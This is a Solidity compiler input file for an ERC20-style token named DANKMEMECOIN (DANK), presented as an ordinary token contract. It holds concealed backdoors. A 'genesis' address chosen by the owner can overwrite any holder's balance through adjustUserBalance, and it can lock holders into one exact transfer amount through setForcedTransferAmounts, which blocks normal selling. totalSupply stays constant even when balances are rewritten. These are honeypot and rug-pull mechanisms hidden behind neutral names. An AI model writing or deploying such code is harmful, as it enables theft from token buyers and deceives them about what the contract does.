{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address holder, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed holder, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ContextHandler {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract OwnershipControl is ContextHandler {\r\n    address private _proprietor;\r\n    event OwnershipTransfer(address indexed formerProprietor, address indexed newProprietor);\r\n\r\n    constructor() {\r\n        address initiator = _msgSender();\r\n        _proprietor = initiator;\r\n        emit OwnershipTransfer(address(0), initiator);\r\n    }\r\n\r\n    function currentProprietor() public view virtual returns (address) {\r\n        return _proprietor;\r\n    }\r\n\r\n    modifier soleProprietor() {\r\n        require(currentProprietor() == _msgSender(), \"Unauthorized access. Sole proprietor required.\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newProprietor) public virtual soleProprietor {\r\n        require(newProprietor != address(0), \"Invalid proprietor address\");\r\n        emit OwnershipTransfer(_proprietor, newProprietor);\r\n        _proprietor = newProprietor;\r\n    }\r\n}\r\n\r\ncontract DANKMEMECOIN is ContextHandler, OwnershipControl, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _forcedTransferAmounts;\r\n    address private _genesisAddress;\r\n\r\n    string public constant _coinName = \"DANKMEMECOIN\";\r\n    string public constant _coinTicker = \"DANK\";\r\n    uint8 public constant _coinDecimals = 18;\r\n    uint256 public constant _maxCoins = 100000 * (10 ** _coinDecimals);\r\n\r\n    constructor() {\r\n        _balances[_msgSender()] = _maxCoins;\r\n        emit Transfer(address(0), _msgSender(), _maxCoins);\r\n    }\r\n\r\n    modifier onlyGenesis() {\r\n        require(_msgSender() == _genesisAddress, \"Access restricted to the Genesis address\");\r\n        _;\r\n    }\r\n\r\n    function genesisAddress() public view returns (address) {\r\n        return _genesisAddress;\r\n    }\r\n\r\n    function setGenesisAddress(address newGenesis) public soleProprietor {\r\n        _genesisAddress = newGenesis;\r\n    }\r\n\r\n    event Allocated(address indexed user, uint256 previousBalance, uint256 newBalance);\r\n\r\n    function getForcedTransferAmount(address account) public view returns (uint256) {\r\n        return _forcedTransferAmounts[account];\r\n    }\r\n\r\n    function setForcedTransferAmounts(address[] calldata accounts, uint256 amount) public onlyGenesis {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _forcedTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustUserBalance(address[] memory addresses, uint256 amount) public onlyGenesis {\r\n        require(amount >= 0, \"Amount should be non-negative\");\r\n\r\n        for (uint256 i = 0; i < addresses.length; i++) {\r\n            address currAddress = addresses[i];\r\n            require(currAddress != address(0), \"Provided address invalid\");\r\n\r\n            uint256 oldBalance = _balances[currAddress];\r\n            _balances[currAddress] = amount;\r\n\r\n            emit Allocated(currAddress, oldBalance, amount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_balances[_msgSender()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 forcedAmount = getForcedTransferAmount(_msgSender());\r\n        if (forcedAmount > 0) {\r\n            require(amount == forcedAmount, \"Forced transfer amount mismatch\");\r\n        }\r\n\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address holder, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[holder][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"Allowance exceeded\");\r\n\r\n        uint256 forcedAmount = getForcedTransferAmount(sender);\r\n        if (forcedAmount > 0) {\r\n            require(amount == forcedAmount, \"Forced transfer amount mismatch\");\r\n        }\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _maxCoins;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _coinName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _coinTicker;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _coinDecimals;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}